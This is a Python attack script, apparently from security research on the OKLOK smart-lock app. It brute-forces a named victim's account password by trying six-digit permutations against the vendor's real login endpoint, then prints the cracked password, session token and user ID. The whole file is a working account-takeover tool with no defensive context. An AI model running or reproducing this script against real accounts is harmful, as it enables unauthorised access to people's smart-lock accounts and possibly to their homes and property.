#!/usr/bin/env python3

import requests
import json
import sys
import itertools
import datetime


def login_victim(victim_email_address):

    password_cracked = False
        
    url = 'https://app.oklok.com.cn/oklock/user/loginByPassword'

    headers = {'Host': 'app.oklok.com.cn',
    'Content-Type': 'application/json',
    'Connection': 'keep-alive',
    'Accept': '*/*',
    'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
    'Accept-Language': 'en-US;q=1',
    'Content-Length': '70',
    'Accept-Encoding': 'gzip, deflate, br'}

    print('\n-------------------------------------------------------------')
    print('Attempting to log in...')

    chars = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
    count = 0
    for i in itertools.permutations(chars, 6):
        count += 1
        password = ''.join(list(i))
        print(password)
        body = {"code":password,"account":victim_email_address,"type":"0"}
        response = requests.post(url, data=json.dumps(body), headers=headers)
        json_resp = response.json()
        status = json_resp['status']
        if status == '2000':
            print(f'Password discovered after {count} tries!\n')
            print('Login Details:')
            print('password: ' + password)
            password_cracked = True
            break
            
    if password_cracked == True:
        result = json_resp['result']
        token = result['token']
        userId = result['userId']
        print('token: ' + str(token))
        print('userId: ' + str(userId))
        print('-------------------------------------------------------------\n')

    else:
        sys.exit('Login not successful :(')


def main():

    start_time = datetime.datetime.now()

    if len(sys.argv) < 2:
        sys.exit('Usage: ownklok_pw.py <victim_email_address>')
    else:
        victim_email_address = sys.argv[1]

    login_victim(victim_email_address)

    end_time = datetime.datetime.now()

    total_time = end_time - start_time

    print('Total Execution Time: ' + str(total_time))
    print('-------------------------------------------------------------\n')

if __name__ == '__main__':
    main()

